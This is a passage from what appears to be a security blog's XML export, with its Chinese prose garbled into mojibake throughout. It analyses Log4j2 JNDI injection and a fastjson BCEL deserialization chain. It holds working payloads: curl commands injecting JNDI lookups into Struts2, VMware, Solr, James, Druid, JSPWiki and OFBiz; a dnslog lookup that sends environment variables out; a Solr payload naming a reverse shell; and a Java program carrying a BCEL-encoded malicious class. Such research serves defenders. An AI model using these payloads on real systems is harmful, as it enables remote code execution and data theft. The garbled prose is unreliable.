URI(name)ÊäõÂá∫‰∫ÜURISyntaxExceptionÂºÇÂ∏∏ÔºåÂàô‰ºöË∑≥ËøáÁôΩÂêçÂçïÊ†°È™åÁõ¥Êé•Ë∞ÉÁî®lookup„ÄÇURIÂä†‰∏çÁºñÁ†ÅÁöÑÁ©∫Ê†ºÂèØ‰ª•Ëß¶ÂèëURISyntaxExceptionË∑≥Âá∫try catchÁõ¥Êé•ÊâßË°ålookupÔºå‰ΩÜÂú®lookupÈáå‰ºöÂéªÊéâÁ©∫Ê†ºÔºåÊ≠£Â∏∏Ëß¶ÂèëJNDIÊ≥®ÂÖ•„ÄÇ 1$&#123;jndi:ldap://127.0.0.1:1389/ badClassName&#125; ÂÖ∂‰ªñÂà©Áî®ÊñπÂºèËØªÂèñÊïèÊÑü‰ø°ÊÅØlog4j‰∏≠ÁöÑ‰∏§‰∏™ÂâçÁºÄsysÂíåenvÔºåÊòØÂàÜÂà´ÈÄöËøáSystem.getProperty()ÂíåSystem.getenv()ÂÆûÁé∞ÁöÑÔºåËÉΩÂ§üËé∑ÂèñÁéØÂ¢ÉÂèòÈáèÂíåÁ≥ªÁªüÂ±ûÊÄßÔºåÂÜçÈÖçÂêàOut-of-BandÔºåÂ∞±ËÉΩËØªÂèñÂà∞ÁéØÂ¢ÉÂèòÈáèÂíåÁ≥ªÁªüÂ±ûÊÄß‰∏≠ÁöÑÊïèÊÑü‰ø°ÊÅØ„ÄÇ POC 1$&#123;jndi:ldap://$&#123;env:USER&#125;.dnslog.cn/abc&#125; ËØªÂèñÈÖçÁΩÆÊñá‰ª∂bundleÂâçÁºÄResourceBundleLookup‰∏≠‰ºöÊää key ÊåâÁÖß :ÂàÜÂâ≤Êàê‰∏§‰ªΩÔºåÁ¨¨‰∏Ä‰∏™ÊòØ bundleName Ëé∑Âèñ ResourceBundleÔºåÁ¨¨‰∫å‰∏™ÊòØ bundleKey Ëé∑Âèñ Properties Value„ÄÇ bundleÂâçÁºÄÂú®Âè™ÂºïÂÖ•log4jÁöÑÈ°πÁõÆ‰∏äÈªòËÆ§‰∏çÊîØÊåÅÔºåÊµãËØïÂú®springÊ°ÜÊû∂ÈáåÊîØÊåÅ„ÄÇ POC 1$&#123;jndi:ldap://$&#123;bundle:bundleName:bundleKey&#125;.ed7yce.dnslog.cn/abc&#125; ÂèóÂΩ±ÂìçÁªÑ‰ª∂Ëß¶ÂèëÊñπÂºèstruts2 Ê£ÄÊü•ËØ∑Ê±ÇË∑ØÂæÑËß¶Âèë Âú®struts2-coreÂåÖÁöÑorg.apache.struts2.dispatcher.mapper#cleanupActionName‰∏≠ÔºåÊ£ÄÊü•actionÂêçÁöÑËåÉÂõ¥ÊòØÂê¶Âú®[a-zA-Z0-9._!/\-]ÂÜÖÔºåËã•Â≠òÂú®ËÆøÈóÆ‰πãÂ§ñÁöÑÂ≠óÁ¨¶ÔºåÂàô‰ºöÂ∞ÜactionÂêçËæìÂá∫Âà∞WARNÊó•Âøó‰∏≠„ÄÇ 12345678protected String cleanupActionName(String rawActionName) &#123; if (this.allowedActionNames.matcher(rawActionName).matches()) &#123; return rawActionName; &#125; else &#123; LOG.warn("&#123;&#125; did not match allowed action names &#123;&#125; - default action &#123;&#125; will be used!", rawActionName, this.allowedActionNames, this.defaultActionName); return this.defaultActionName; &#125;&#125; Âú®ËØ∑Ê±ÇË∑ØÂæÑ‰∏≠‰∏§‰∏™Áõ∏ÈÇªÁöÑ/‰ºöË¢´ËΩ¨Êç¢‰∏∫‰∏Ä‰∏™/ÔºåÂ∞ÜÂÖ∂‰∏≠‰∏Ä‰∏™/ÊõøÊç¢‰∏∫${::-/}ÂèØÈò≤Ê≠¢Ë¢´ËΩ¨Êç¢„ÄÇ ÊúâÁöÑstruts2ÁâàÊú¨ÁöÑÁõ∏ÂêåÁ±ª‰∏≠ËøòÂ≠òÂú®cleanupNamespaceNameÊñπÊ≥ïÔºåÂà©Áî®ÊñπÂºèÁõ∏Âêå„ÄÇ POC 1http://localhost:8080/helloworld_war/$%7Bjndi:rmi:$%7B::-/%7D/127.0.0.1:8888/Calc%7D/ Ê£ÄÊü•ËØ∑Ê±ÇÂèÇÊï∞ÈïøÂ∫¶ Âú®struts2-coreÂåÖÁöÑcom.opensymphony.xwork2.interceptor#isWithinLengthLimit‰∏≠ÔºåËÆøÈóÆ‰∏Ä‰∏™Â≠òÂú®ÁöÑactionÔºå‰ºöÊ£ÄÊü•ËØ∑Ê±ÇÂèÇÊï∞ÂêçÁöÑÈïøÂ∫¶ÔºåËã•ÈïøÂ∫¶Ë∂ÖËøáÈªòËÆ§ÁöÑ100‰∏™Â≠óÁ¨¶ÔºåËØ∑Ê±ÇÂèÇÊï∞ÂêçÂàô‰ºöËæìÂá∫Âà∞debugÊó•Âøó‰∏≠„ÄÇ 12345678protected boolean isWithinLengthLimit(String name) &#123; boolean matchLength = name.length() &lt;= this.paramNameMaxLength; if (!matchLength) &#123; LOG.debug("Parameter [&#123;&#125;] is too long, allowed length is [&#123;&#125;]", name, String.valueOf(this.paramNameMaxLength)); &#125; return matchLength;&#125; POC 1http://localhost:8080/helloworld_war/hello.action?$%7Bjndi:rmi://127.0.0.1:8888/Calc%7Daaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=123 Ëé∑ÂèñÈùôÊÄÅÊñá‰ª∂If-Modified-SinceÂ§¥ struts2Âú®org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter#doFilterÊã¶Êà™‰∏Ä‰∏™ËØ∑Ê±ÇÔºå‰∏îËØ∑Ê±ÇÁöÑË∑ØÂæÑ‰∏çÂú®ÊéíÈô§ÁöÑË∑ØÂæÑÂÜÖÔºåÂàô‰ºöÂÖàË∞ÉÁî®executeÂ±ûÊÄßÁöÑexecuteStaticResourceRequestÊñπÊ≥ïÔºåÂà§Êñ≠ÊòØÂê¶‰∏∫ÈùôÊÄÅÊñá‰ª∂„ÄÇ Âú®org.apache.struts2.dispatcher.ExecuteOperations#executeStaticResourceRequestÈáåÔºåËØ∑Ê±Ç‰ª•strutsÊàñstaticÂºÄÂ§¥Âàô‰ºö‰∫§ÁªôDefaultStaticContentLoaderÁöÑfindStaticResourceÂ§ÑÁêÜ„ÄÇ findStaticResourceÊñπÊ≥ï‰∏≠ÔºåÈùôÊÄÅÊñá‰ª∂‰ºö‰ªéstruts2 coreÁöÑorg.apache.struts.staticÂåÖ‰∏ãÊâæÔºåÁÑ∂Âêé‰ºö‰∫§ÁªôÂêåÁ±ªÁöÑprocessÊñπÊ≥ïÂ§ÑÁêÜ„ÄÇËØ•ÂåÖÂ≠òÂú®‰ª•‰∏ãÈùôÊÄÅÊñá‰ª∂„ÄÇ tooltip.gif domtt.css utils.js domTT.js inputtransfersselect.js optiontransferselect.js processÊñπÊ≥ïÈáåÔºåÈùôÊÄÅÊñá‰ª∂ËæìÂÖ•ÊµÅÈùûÁ©∫Êó∂ÔºåÂàô‰ºöÂ∞ùËØïÂ∞ÜËØ∑Ê±ÇÂ§¥If-Modified-SinceÁöÑÂÄºËΩ¨‰∏∫DateÁ±ªÂûãÔºåÂΩìËΩ¨Êç¢Â§±Ë¥•ÊäõÂá∫ÂºÇÂ∏∏ÔºåIf-Modified-SinceÁöÑÂÄºÂ∞±‰ºöËæìÂá∫Âà∞WARNÊó•Âøó‰∏≠„ÄÇ Êàë‰ª¨ËÆøÈóÆstruts2‰∏≠ÈªòËÆ§ÁöÑÈùôÊÄÅÊñá‰ª∂ÔºåÂπ∂ËÆæÁΩÆIf-Modified-SinceÂ§¥‰∏∫ÈùûDateÁ±ªÂûãÂç≥ÂèØËß¶Âèëlog4jÊºèÊ¥û„ÄÇ POC 1curl -vv -H &quot;If-Modified-Since: \$&#123;jndi:rmi:\$&#123;::-/&#125;/localhost:8888/Calc&#125;&quot; http://192.168.217.1:8080/helloworld_war/struts/utils.js vmware1curl --insecure -vv -H &quot;X-Forwarded-For: \$&#123;jndi:ldap://10.0.0.3:1270/lol&#125;&quot; &quot;https://10.0.0.4/websso/SAML2/SSO/photon-machine.lan?SAMLRequest=&quot; slor12curl &apos;http://localhost:8983/solr/admin/collections?action=$&#123;jndi:ldap://xxx/Basic/ReverseShell/ip/9999&#125;&amp;wt=json&apos;curl &apos;http://localhost:8983/solr/admin/cores?action=CREATE&amp;name=$%7Bjndi:ldap://10.0.0.6:1270/abc%7D&amp;wt=json&apos; James12echo 233 &gt; email.txtcurl --url &quot;smtp://localhost&quot; --user &quot;test:test&quot; --mail-from &apos;$&#123;jndi:ldap://localhost:1270/abc&#125;@gmail.com&apos; --mail-rcpt &apos;test&apos; --upload-file email.txt Druid1curl -vv -X DELETE &apos;http://localhost:8888/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2flocalhost:1270%2fabc%7d&apos; JSPWiki1curl -vv http://localhost:8080/JSPWiki/wiki/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/ OFBiz1curl --insecure -vv -H &quot;Cookie: OFBiz.Visitor=\$&#123;jndi:ldap://localhost:1270/abc&#125;&quot; https://localhost:8443/webtools/control/main ÂêéËÆ∞Âú®ÊàêÊñáÈÇ£Â§©Êó©‰∏äÔºå@su18Â∏àÂÇÖÂú®Áæ§ÈáåÂèëÂ∏Élog4jËØ¶ÁªÜÂàÜÊûêÊñáÁ´†ÔºåÂÖ∂‰∏≠ËøòÊúâlog4j 1.xÁöÑJNDIÂà©Áî®ÊÄùË∑ØÔºåËôΩÁÑ∂ÂÆûÁé∞Êù°‰ª∂Êå∫ËãõÂàªÔºå‰ΩÜ‰∏çÂæó‰∏çÊÑüÂèπÂ∏àÂÇÖ‰ª¨ÁúüÁöÑÁªÜ„ÄÇ ËøôÁØáÊñáÁ´†ÂÜô‰∏ãÊù•Â∞±Ëä±‰∫Ü‰∏ÄÂ§©ÂçäÁöÑÊó∂Èó¥ÔºåÊØî‰ª•ÂæÄÂø´‰∫Ü‰∏çÂ∞ëÔºåËΩ¨‰∫ÜÂÆâÂÖ®Á†îÁ©∂Â≤óËøòÊòØÊúâÊå∫Â§öÊó∂Èó¥Â≠¶‰∏úË•øÁöÑÔºåËôΩÁÑ∂‰πüÊúâÊÄïleaderÂÇ¨ÁöÑÁºòÊïÖ„ÄÇüòÇ ÂèÇËÄÉhttps://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg https://lorexxar.cn/2021/12/10/log4j2-jndi/#2-15-0-rc1-%E7%9A%84%E4%BF%AE%E5%A4%8D https://xz.aliyun.com/t/10649#toc-2 https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>log4j</tag>
        <tag>struts2</tag>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastjson‰∏çÂá∫ÁΩëÂà©Áî®ÁÆÄÊûê]]></title>
    <url>%2F2021%2F11%2F25%2Ffastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂèàÊù•ÁÇíÂÜ∑È•≠Âï¶ÔºåÂÅöÈ°πÁõÆÁªà‰∫éÈÅáÂà∞‰∏™fastjsonÂèçÂ∫èÂàóÂåñÔºå‰ΩÜÂèà‰∏çÊÉ≥Ë¥°ÁåÆËá™Â∑±ÁöÑVPSÂá∫Êù•Êê≠‰∏™JNDIÔºå‰∫éÊòØÁΩë‰∏äÊâæ‰∏™POCËØï‰∫Ü‰∏ã„ÄÇDuangÁöÑ‰∏Ä‰∏ãÁ´üÁÑ∂ÊàêÂäü‰∫ÜÔºåÊâßË°åÂëΩ‰ª§ËøòÊúâÂõûÊòæÔºåÊúâÁÇπÊÑèÊÄùÂïäÔºå‰∫éÊòØÂºÄÂßãÁÇíÂÜ∑È•≠‰∫Ü„ÄÇ Âà©Áî®ÂâçÊèêÊó¢ÁÑ∂ÊòØ‰∏çÂá∫ÁΩëÔºåËÆ∏Â§öPOC‰∏≠Âà©Áî®JNDIËøúÁ®ãÂä†ËΩΩÂ§ñÈÉ®Á±ªÁöÑÊñπÊ≥ïÂ∞±Êó†Ê≥ï‰ΩøÁî®‰∫ÜÔºå‰∏çÂá∫ÁΩëÁöÑÂà©Áî®ÈúÄË¶ÅÊó†ÈúÄÂä†ËΩΩÁ±ªÊàñÂèØÈÄöËøáÁ±ªÂ±ûÊÄßÂä†ËΩΩ„ÄÇÂè¶‰∏Ä‰∏™ÂâçÊèêÂ∞±ÊòØËé∑ÂèñÂëΩ‰ª§ÁöÑÊâßË°åÁªìÊûúÔºåÂèØ‰ª•Â∞ÜÁªìÊûúÂÜôÂÖ•Âà∞webÁõÆÂΩïÔºåËÆøÈóÆËØ•Êñá‰ª∂Ëé∑ÂèñÁªìÊûúÔºå‰ΩÜÊõ¥‰ºòÈõÖÁöÑÊñπÂºèÊòØËé∑ÂèñresponseÔºåÂ∞ÜÁªìÊûú‰ªéÂìçÂ∫î‰ø°ÊÅØ‰∏≠ËæìÂá∫„ÄÇ ËøúÁ®ãÂä†ËΩΩÁ±ªÁõÆÂâçÂÖ¨ÂºÄ‰∏îËæÉ‰∏∫ÈÄöÁî®ÁöÑ‰∏çÂá∫ÁΩëÂà©Áî®ÈìæÊúâ‰∏§Êù°„ÄÇ com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl org.apache.tomcat.dbcp.dbcp2.BasicDataSource TemplatesImpl‰∏ä‰∏ÄÁØáÊñáÁ´†Â∑≤ÁªèÂàÜÊûêËøá‰∫ÜÔºåÂèçÂ∫èÂ∫èÂàóÂåñÊñπÊ≥ï‰∏≠featureÂèÇÊï∞ÈúÄË¶ÅËÆæÁΩÆ‰∏∫ÂÖÅËÆ∏ÁªôÈùûÂÖ¨ÊúâÂ±ûÊÄßËµãÂÄºÔºå‰∏éBasicDataSourceÁõ∏ÊØîÂ∞±Êúâ‰∫õÈ∏°ËÇã‰∫Ü„ÄÇBasicDataSourceÂè™ÈúÄË¶ÅÊúâdbcpÊàñtomcat-dbcpÁöÑ‰æùËµñÂç≥ÂèØÔºådbcpÂç≥Êï∞ÊçÆÂ∫ìËøûÊé•Ê±†ÔºåÂú®java‰∏≠Áî®‰∫éÁÆ°ÁêÜÊï∞ÊçÆÂ∫ìËøûÊé•ÔºåËøòÊòØÊå∫Â∏∏ËßÅÁöÑ„ÄÇ ‰ª•‰∏ãÊòØ‰∏Ä‰∏™Âä†ËΩΩÊÅ∂ÊÑèÁ±ªÔºåËÄåÊÅ∂ÊÑèÁ±ªÈùôÊÄÅ‰ª£Á†Å‰∏≠ÊúâÂÜô‰∫ÜRuntimeÂºπËÆ°ÁÆóÂô®ÁöÑPOCÔºåËÄÅÊ†∑Â≠êÂú®execÊñπÊ≥ïÂ§Ñ‰∏ãÊñ≠ÁÇπÔºåÂèëÁé∞Ë∞ÉÁî®Ê†àËøòÊòØÊØîËæÉÈí±ÁöÑÔºåÂèØ‰ª•‰ªéÂºÄÂ§¥ÂºÄÂßãÂàÜÊûê„ÄÇ 1234567891011121314151617181920package com.p1ay2win.fastjson;import com.alibaba.fastjson.JSON;public class BCEL &#123; public static void main(String[] args)&#123; String payload2 = "&#123;\n" + " &#123;\n" + " \"x\":&#123;\n" + " \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" + " \"driverClassLoader\": &#123;\n" + " \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" + " &#125;,\n" + " \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\"\n" + " &#125;\n" + " &#125;: \"x\"\n" + "&#125;"; JSON.parse(payload2); &#125;&#125; Áõ¥Êé•Ë∑üËøõÂà∞com.alibaba.fastjson.parser.DefaultJSONParser#parseObjectÔºåÂΩìÂèçÂ∫èÂàóÂåñÁöÑÂØπË±°‰∏∫JSONObjectÊó∂Ôºå‰ºöË∞ÉÁî®ÈîÆÁöÑtoStringÊñπÊ≥ï„ÄÇÊ≠§Êó∂ÁöÑÈîÆÊòØÈîÆ‰∏∫xÔºåÂÄº‰∏∫BasicDataSourceÂØπË±°ÁöÑJSONObjectÂØπË±°„ÄÇ Ë∑üËøõcom.alibaba.fastjson.JSON#toStringÔºåËøîÂõûÁöÑÊòØÂÆÉÁöÑtoJSONStringÊñπÊ≥ïÁöÑÂÄº„ÄÇÊé•ÁùÄÂèàÂ•óÂ®ÉË∞ÉÁî®‰∫Ü‰∏âÊ¨°writeÊñπÊ≥ïÔºåÊù•Âà∞‰∫Ücom.alibaba.fastjson.serializer.ASMSerializer_1_BasicDataSource#write„ÄÇIDEAÂπ∂‰πàÊúâËØÜÂà´Âá∫ASMSerializer_1_BasicDataSourceÁöÑÊ∫êÁ†ÅÔºå‰πüÂ∞±ÊòØcom.alibaba.fastjson.serializer‰∏ãÂπ∂Ê≤°ÊúâËøô‰∏™Á±ª„ÄÇ ÂõûÂà∞com.alibaba.fastjson.serializer.MapSerializer#writeË∞ÉÁî®serializerÂ±ûÊÄßÁöÑgetObjectWriterÊñπÊ≥ïÂ§ÑË∑üËøõÔºåÂèëÁé∞ÊúÄÁªàË∞ÉÁî®ÁöÑÊòØcom.alibaba.fastjson.serializer.SerializeConfig#createASMSerializerÔºåASMSerializerFactoryÂ∑•ÂéÇÁ±ªÁîüÊàê‰∫ÜBasicDataSourceÁöÑASMSerializer‰∏ìÂ±ûÂ≠êÁ±ªASMSerializer_1_BasicDataSource„ÄÇ ÂÖ≥‰∫éASMSerializer_1_BasicDataSourceËøô‰∏™Á±ªÔºåËøôÈáåÂ∞±Ê∂âÂèä‰∫Ü‰∏Ä‰∏™Áü•ËØÜÁÇπÔºöASM„ÄÇ ASMÊòØ‰∏Ä‰∏™ÈÄöÁî®ÁöÑJavaÂ≠óËäÇÁ†ÅÊìç‰ΩúÂíåÂàÜÊûêÊ°ÜÊû∂ÔºåÂÆÉÂèØ‰ª•Áî®Êù•‰øÆÊîπÁé∞ÊúâÁöÑÁ±ªÊàñÁõ¥Êé•‰ª•‰∫åËøõÂà∂ÂΩ¢ÂºèÂä®ÊÄÅÁîüÊàêÁ±ª„ÄÇASMÊèê‰æõ‰∫Ü‰∏Ä‰∫õÂ∏∏ËßÅÁöÑÂ≠óËäÇÁ†ÅËΩ¨Êç¢ÂíåÂàÜÊûêÁÆóÊ≥ïÔºå‰ªé‰∏≠ÂèØ‰ª•ÊûÑÂª∫ÂÆöÂà∂ÁöÑÂ§çÊùÇËΩ¨Êç¢Âíå‰ª£Á†ÅÂàÜÊûêÂ∑•ÂÖ∑„ÄÇASMÊèê‰æõ‰∫Ü‰∏éÂÖ∂‰ªñJavaÂ≠óËäÇÁ†ÅÊ°ÜÊû∂Á±ª‰ººÁöÑÂäüËÉΩÔºå‰ΩÜ‰æßÈáç‰∫éÊÄßËÉΩ„ÄÇÂõ†‰∏∫ÂÆÉÁöÑËÆæËÆ°ÂíåÂÆûÁé∞ÈÉΩÂ∞ΩÂèØËÉΩÂ∞èÂíåÂø´ÔºåÊâÄ‰ª•ÂÆÉÈùûÂ∏∏ÈÄÇÂêàÂú®Âä®ÊÄÅÁ≥ªÁªü‰∏≠‰ΩøÁî®ÔºàÂΩìÁÑ∂‰πüÂèØ‰ª•‰ª•ÈùôÊÄÅÊñπÂºè‰ΩøÁî®Ôºå‰æãÂ¶ÇÂú®ÁºñËØëÂô®‰∏≠Ôºâ„ÄÇ ÁîüÊàêËøô‰∏™Á±ªÁöÑwriteÊñπÊ≥ï‰∏≠‰ºöË∞ÉÁî®BasicDataSourceÁ±ªÁöÑgetterÊñπÊ≥ïÔºåÂÖ∂‰∏≠Â∞±ÊúâÊúÄÂºÄÂßãË∞ÉÁî®Ê†à‰∏≠ÁöÑorg.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnectionÊñπÊ≥ï„ÄÇÊé•ÁùÄË∑üËøõÂà∞org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactoryÔºåÂΩìdriverClassLoaderÈùûÁ©∫Êó∂Ôºå‰ºöË∞ÉÁî®loaderÂèØÊéßÁöÑforNameÈáçËΩΩÊñπÊ≥ï„ÄÇ Ê≠§Êó∂ÁöÑloaderÊòØBCELÁöÑClassLoaderÔºåËøôÊòØ‰∏Ä‰∏™Á•ûÂ•áÁöÑClassLoader„ÄÇÂΩìÂèçÂ∞ÑÁöÑÁ±ªÂêçÊòØ$$BCEL$$ÂºÄÂ§¥Êó∂Ôºå‰ºöÂ∞ÜÁ±ªÂêçÂâ©‰ΩôÈÉ®ÂàÜËß£Á†Å‰Ωú‰∏∫ËæìÂÖ•ÊµÅÔºåËß£ÊûêÂπ∂ËøîÂõû‰∏Ä‰∏™ClassÂÆû‰æãÔºåÈÇ£‰πàÊÅ∂ÊÑèÁ±ªÁöÑÈùôÊÄÅ‰ª£Á†Å‰∏≠ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÂ∞±‰ºöË¢´ÊâßË°å„ÄÇ ÂõûÊòæÂú®ÁΩë‰∏äÊâæÂà∞‰∫Ü‰∏§‰∏≤BCELÂõûÊòæÁöÑPOCÔºå‰ΩøÁî®BCELËá™Â∏¶ÁöÑUtilityÂ∑•ÂÖ∑Á±ªËß£Á†ÅÔºå‰øùÂ≠ò‰∏∫.classÊñá‰ª∂Â∞±ÂèØ‰ª•Áî®IDEAÂèçÁºñËØëÁõ¥Êé•Áúã„ÄÇËß£Á†ÅDemoÂ¶Ç‰∏ãÔºö 12345678public class BCELDecode &#123; public static void main(String[] args) throws IOException &#123; String encode = "$l$8b$I$A$A$A$A$A$A$A..."; byte[] decode = Utility.decode(encode,true); FileOutputStream fileOutputStream = new FileOutputStream("DecodeClass.class"); fileOutputStream.write(decode); &#125;&#125; ÂÖàÊù•ÁúãÁúãSpringËé∑ÂèñrequestÂíåresponseÁöÑÂäûÊ≥ïÔºåÊòØ‰∏ÄÁßçËæÉ‰∏∫ÈÄöÁî®ÁöÑÊñπÊ≥ï„ÄÇSpringÂú®ËØ∑Ê±ÇÈ¢ÑÂ§ÑÁêÜË∞ÉÁî®processRequestÊñπÊ≥ïÁöÑÊó∂ÂÄôÔºå‰ºöÂ∞ÜrequestÂíåresponseÊîæËøõRequestContextHolderÁöÑÁ∫øÁ®ãÂ±ÄÈÉ®ÂèòÈáèÈáåÔºåÊâÄ‰ª•ÂΩìÂâçÁ∫øÁ®ãÁöÑ‰ªª‰ΩïÂú∞ÊñπÈÉΩÂèØ‰ª•ÂèñÁî®Âà∞requestÂíåresponse„ÄÇ Âú®ÁúãÁúãtomcatÁöÑÂõûÊòæÔºå‰ª£Á†ÅÁ®çÈïøÔºåÂà©Áî®ÁöÑÊòØc0ny1Â∏àÂÇÖÊèêÂá∫ÁöÑ‰∏ÄÁßçÊñπÊ≥ïÔºåÊ∑±Â∫¶‰ºòÂÖàÊêúÁ¥¢ÈÅçÂéÜÂΩìÂâçÁ∫øÁ®ãÁöÑÊâÄÊúâÂ±ûÊÄßÊâæÂà∞requestÂíåresponseÔºåÊòØtomcat‰∏ä‰∏ÄÁßçËæÉ‰∏∫ÈÄöÁî®ÁöÑÂõûÊòæÊñπÊ≥ï„ÄÇËØ¶ÁªÜÁöÑÂàÜÊûêÂèØ‰ª•Âú®c0ny1ÁöÑÊñáÁ´†ÔºöÂçäËá™Âä®ÂåñÊåñÊéò request ÂÆûÁé∞Â§öÁßç‰∏≠Èó¥‰ª∂ÂõûÊòæ‰∏≠ÁúãÂà∞ÔºåËøôÈáåÂ∞±‰∏çÂ±ïÂºÄËØ¥„ÄÇ ‰ª•‰∏ä‰∏§ÁßçÊñπÊ≥ïÈÉΩÁî®Thread.currentThread().getContextClassLoader()Ëé∑Âèñ‰∏ä‰∏ãÊñáÁ±ªÂä†ËΩΩÂô®Êù•Âä†ËΩΩÁ±ªÔºå‰∏™‰∫∫ÁöÑÁêÜËß£Âë¢ÔºåÊòØÂõ†‰∏∫JavaÁöÑÂèå‰∫≤ÂßîÊ¥æÊú∫Âà∂„ÄÇÁõ¥Êé•‰ΩøÁî®Class.forNameÂä†ËΩΩÁöÑËØùÔºåÂú®ÂèçÂ∫èÂàóÂåñÊàñÂä†ËΩΩÂÜÖÂ≠òÈ©¨ÁöÑÁÇπÁöÑÁ±ªÂä†ËΩΩÂô®ÊòØspringÂíåtomcatÁ±ªÁöÑÁ±ªÂä†ËΩΩÂô®ÁöÑparentÁ±ªÂä†ËΩΩÂô®ÔºåÊàñÊòØ‰∏é‰ªñÂπ≥Ë°åÁöÑÂàÜÊîØÔºåÁõ¥Êé•Áî®Class.forNameÂ∞±Êó†Ê≥ïÂä†ËΩΩÂà∞springÂíåtomcatÁöÑÁ±ª„ÄÇ ËÄåSpringÂíåtomcatÂèàÂõ†‰∏∫‰∏çÂêåWebÂ∫îÁî®‰∏çÂêåÁâà‰æùËµñÊú¨ÂÖ±Â≠ò„ÄÅÂä®ÊÄÅÂä†ËΩΩjspÁ≠â‰∏Ä‰∫õÂéüÂõ†ÊâìÁ†¥‰∫ÜÂèå‰∫≤ÂßîÊ¥æÊú∫Âà∂Ôºå‰ºöÂ∞ÜÂΩìÂâçÁ∫øÁ®ãÁöÑ‰∏ä‰∏ãÊñáÁ±ªÂä†ËΩΩÂô®ËÆæÁΩÆ‰∏∫‰ªñ‰ª¨ÂêÑËá™ÁöÑWebÂ∫îÁî®Á±ªÂä†ËΩΩÂô®ÔºåÂàöÂ•ΩÂ∞±ËÉΩÈÄöËøá‰∏ä‰∏ãÊñáÁ±ªÂä†ËΩΩÂô®Âä†ËΩΩÂà∞ÊÉ≥Ë¶ÅÁöÑSpringÂíåtomcatÁ±ª„ÄÇ ‰ª•‰∏äÊòØ‰∏™‰∫∫ÂØπ‰∏ä‰∏ãÊñáÁ±ªÂä†ËΩΩÂô®Âú®ÂõûÊòæ‰∏≠‰ΩúÁî®ÁöÑ‰∏™‰∫∫ÁêÜËß£ÔºåËã•ÂÖ∂‰∏≠ÊúâËØØÔºåÊ¨¢Áî®ÂêÑ‰ΩçÂ∏àÂÇÖÊñßÊ≠£„ÄÇ ÂêéËÆ∞‰ª•‰∏äÊ∂âÂèäÁöÑÁü•ËØÜÁÇπ‰πüÂ∞±ÊòØBCELÁöÑClassloaderÁâπÊÄß„ÄÅÂèå‰∫≤ÂßîÊ¥æÊú∫Âà∂ÂíåÊâìÁ†¥Âèå‰∫≤ÂßîÊ¥æÁöÑÊñπÊ≥ïÔºåÂ•ΩÂÉè‰πüÊ≤°‰ªÄ‰πàÔºå‰ΩÜËøôÊÆµÊó∂Èó¥ÁöÑÂøÉË∑ØÂéÜÁ®ãËÆ©ÊàëÊÉ≥Ëµ∑Êù•ÁéãÂÆ∂Âç´‰∏úÈÇ™Ë•øÊØíÈáåÁöÑ‰∏ÄÂè• 